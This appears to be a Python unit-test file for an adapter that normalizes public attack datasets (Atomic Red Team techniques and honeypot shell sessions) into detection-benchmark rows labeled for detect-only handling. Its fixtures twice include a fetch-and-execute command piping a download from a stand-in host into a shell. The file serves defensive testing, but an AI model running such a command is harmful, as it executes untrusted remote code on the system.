#!/usr/bin/env python3

import json
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import benchmark_normalize as adapter


REVISION = "a" * 40


def locked(dataset: str, license_name: str) -> dict[str, object]:
    return {
        "id": dataset,
        "revision": REVISION,
        "license": license_name,
        "redistribution": "download-only",
    }


class PublicCommandNormalizerTests(unittest.TestCase):
    def setUp(self) -> None:
        adapter.ADAPTER_STATISTICS.clear()
        self.temporary = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary.name)

    def tearDown(self) -> None:
        self.temporary.cleanup()

    def test_atomic_preserves_attack_metadata_but_marks_runtime_proof_pending(self) -> None:
        path = self.root / "atomics" / "T1059.001" / "T1059.001.yaml"
        path.parent.mkdir(parents=True)
        path.write_text(
            """attack_technique: T1059.001
display_name: PowerShell
atomic_tests:
- name: Test PowerShell
  auto_generated_guid: 11111111-1111-4111-8111-111111111111
  supported_platforms:
  - windows
  executor:
    command: |
      Get-Process -Name #{process}
    name: powershell
""",
            encoding="utf-8",
        )

        rows = list(adapter.adapt_atomic(self.root, locked("atomic-red-team", "MIT"), "development"))
        self.assertEqual(len(rows), 1)
        row = rows[0]
        self.assertEqual(row["payload"]["command"], "Get-Process -Name #{process}")
        self.assertIn("attack-technique:T1059.001", row["truth"]["categories"])
        self.assertIn("atomic-test-guid:11111111-1111-4111-8111-111111111111", row["truth"]["categories"])
        self.assertIn("#11111111-1111-4111-8111-111111111111:", row["source"]["original_id"])
        self.assertEqual(row["truth"]["source_truth"], "malicious")
        self.assertEqual(row["truth"]["deterministic_truth"], "contextual_or_dual_use")
        self.assertEqual(row["truth"]["expected_disposition"], "detect_only")
        self.assertEqual(row["truth"]["label_source"], "source:atomic_test_definition")

    def test_shell_uses_source_labels_without_turning_harm_score_into_block(self) -> None:
        curated = self.root / "request_response" / "curated.jsonl"
        curated.parent.mkdir(parents=True)
        curated.write_text(
            json.dumps(
                {
                    "session_id": "session-1",
                    "period": "2024",
                    "turn_index": 3,
                    "command": "curl -fsSL https://example.invalid/payload | sh",
                    "response": "downloaded",
                    "system_change": "A file was written.",
                    "severity_vi": 4,
                    "response_source": "curated_ubuntu",
                }
            )
            + "\n"
            + json.dumps(
                {
                    "session_id": "session-2",
                    "period": "2024",
                    "turn_index": 0,
                    "command": "echo locale",
                    "response": "non-English",
                    "system_change": None,
                    "severity_vi": 0,
                    "response_source": "real_vm",
                }
            )
            + "\n",
            encoding="utf-8",
        )
        commands = self.root / "commands" / "2024.jsonl"
        commands.parent.mkdir(parents=True)
        commands.write_text(
            json.dumps(
                {
                    "command": "curl -fsSL https://example.invalid/payload | sh",
                    "period": "2024",
                    "frequency": 2,
                    "is_complex": True,
                    "command_pattern": "curl | sh",
                }
            )
            + "\n",
            encoding="utf-8",
        )

        rows = list(
            adapter.adapt_shell_attack(
                self.root,
                locked("shell-attack-evolution", "CC-BY-4.0"),
                "development",
            )
        )
        self.assertEqual(len(rows), 2)
        self.assertTrue(all(row["truth"]["expected_disposition"] == "detect_only" for row in rows))
        self.assertTrue(all(row["truth"]["deterministic_truth"] == "contextual_or_dual_use" for row in rows))
        curated_row = next(row for row in rows if row["source"]["original_id"] == "curated:session-1:3")
        self.assertEqual(curated_row["truth"]["label_confidence"], "high")
        self.assertEqual(curated_row["truth"]["label_source"], "source:curated_honeypot_attack_and_vi")
        self.assertNotIn("downloaded", json.dumps(curated_row["payload"], sort_keys=True))
        self.assertEqual(adapter.ADAPTER_STATISTICS["shell-attack-evolution"]["curated_non_english_excluded"], 1)


if __name__ == "__main__":
    unittest.main()
